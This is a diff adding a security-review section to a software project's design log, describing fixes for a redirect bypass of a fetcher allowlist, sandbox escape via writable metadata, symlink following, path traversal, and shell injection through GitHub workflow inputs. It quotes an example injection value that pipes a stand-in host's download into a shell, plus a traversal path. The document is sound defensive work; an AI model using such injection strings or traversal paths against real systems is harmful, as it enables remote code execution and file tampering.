@@ -1590,3 +1590,94 @@ Reproducibility note worth keeping: this run and the `compare_orders` order-4 ru
 26.289909 on held-out sets whose fingerprints differ, because the repository's own documents are in
 the corpus and were edited between the runs. Two ten-millionths of a difference from three tokens of
 text — the fingerprint refused the comparison and the numbers agree anyway.
+
+
+## D18. A security pass, and the shape the four real findings share
+
+**Asked.** Find and fix all security issues.
+
+**Resolved.** Four issues where a stated constraint was checked in a place that did not bind, plus
+the workflow-injection pattern, fixed uniformly. `npm audit` reports zero vulnerabilities and there
+are no secrets in the tree; nothing in the Python package uses `pickle`, `eval`, `yaml.load` or a
+shell, and the one `child_process` call is the sandbox's allowlisted `run`.
+
+Every one of the four is the same mistake in a different file: **the check ran next to the operation
+rather than on it.**
+
+### 1. The fetcher's allowlist did not survive a redirect
+
+`_check_url` runs before `urlopen`, and the default opener follows redirects with a handler whose
+only scheme guard is `('http', 'https', 'ftp', '')` — read out of the installed stdlib rather than
+recalled. One 302 from an allowlisted host and the fetcher goes anywhere, over plain http if the
+host prefers. Both the https-only rule and the URL-prefix allowlist, the two constraints
+`docs/PROVENANCE.md` names as the boundary, stop applying after the first hop.
+
+`test/boundary.test.ts` pinned that the check exists, that it normalises, and that it refuses `..`
+and `%2e%2e`. Nothing pinned that it runs more than once. **A constraint checked before an operation
+is not a constraint on the operation.**
+
+Fixed with a redirect handler that re-runs the check on every hop, replacing the stdlib's rather than
+joining it, plus a check on the response's final URL after the exchange. A response is also capped at
+16MB: `--max-bytes` is a per-source total checked between documents, so one `read()` could take any
+amount of memory.
+
+### 2. A stage could redirect its own promotion by editing one file
+
+The sandbox's metadata carried `source`, and `promote` copies there. It lived at
+`<root>/.adhd-sandbox.json` — **inside the tree the stage writes to**, which is the one thing a
+sandbox is for. Rewriting that field pointed the promotion at any directory the process could reach.
+
+And it was worse than a write. Everything already in the redirected directory is absent from the
+sandbox, so `diff` classified it `removed` and `promote` deleted it. Reproduced before fixing: a
+sandbox holding one changed file, pointed at a directory holding `secret.txt`, promoted with
+`refused: []` and left that directory holding one file that was not `secret.txt`.
+
+The module's docstring says it is "a filesystem sandbox, not a security boundary" and "does not
+contain a hostile process". That is a fair caveat about a stage with Bash, and it does not cover
+this: the escalation needed one file write inside the sandbox, which is precisely what the sandbox
+grants. Metadata now lives at `<root>.json`, a sibling, outside the tree the stage was handed, and
+`promote` checks each destination against the recorded source as well as each source path against the
+sandbox.
+
+### 3. The sandbox walk followed symlinks
+
+`statSync` rather than `lstatSync`, so a link to a directory outside made `diff` report files that
+were never in the sandbox and `promote` copy them into the source, and a link to an ancestor made the
+walk recurse until the path length killed it. The second needs nobody hostile — a build tool can
+leave one behind. Symlinks are skipped now.
+
+### 4. `recordRun` built a path out of two unvalidated strings
+
+`evals/recorded/<fixture>-<name>`, then `cpSync` with `recursive`, replacing what is there when
+`force` is set. A name of `../../../../tmp/x` writes a whole run directory outside the repository,
+and it is reachable from the MCP `record` tool, so the string can come from model output. The kernel
+already held run ids to `^[A-Za-z0-9][A-Za-z0-9_.-]{0,80}$`; this was the one path built from strings
+that reached the filesystem unchecked. Both halves are validated now, before the run is read, so a
+bad name fails as a bad name.
+
+`brief_path` and `artifact_path` come from the compiler rather than from a worker, so they were not a
+hole, but they are resolved against the run directory and refused if they leave it. The run directory
+is a boundary that should hold without depending on which file produced the path.
+
+### 5. Workflow inputs interpolated into shell scripts
+
+`${{ }}` inside `run:` is textual substitution before the shell sees it, so an input of
+`1500" ; curl evil | sh ; echo "` closes the quotes and runs. Every instance was behind write access
+— `workflow_dispatch` inputs, `github.repository`, `github.event_name` — so none was reachable by a
+stranger, and `github.repository` was never attacker-controlled at all. They are all through `env:`
+now, and a test scans every `run:` block in every workflow.
+
+**The rule is held without exemptions on purpose.** Three of the five sites were provably safe, and
+an exemption list is how a rule like this rots: the safe cases teach the reader that the pattern is
+fine, and the next one is a dispatch input. `$REPO` costs nothing.
+
+### What was checked and found clean
+
+`npm audit` with and without dev dependencies: zero. No secrets, keys or tokens in the tree — the
+only `token` in the codebase is the kernel's lock ownership nonce. No `pickle`, `eval`, `exec`,
+`yaml.load`, `os.system` or `shell=True` anywhere in `analysis/`; the model format is gzipped TSV
+explicitly because pickle would make a CI-loaded artifact into code execution. The one child process
+is `Sandbox.run`, whose allowlist matches the whole command string rather than a prefix. Regexes
+built from frame labels escape their metacharacters. Workflow permissions are least-privilege
+(`contents: read` everywhere, with `issues: write` on maintenance and `id-token`/`packages` on
+release). The `github-script` step interpolates only `context.*`.
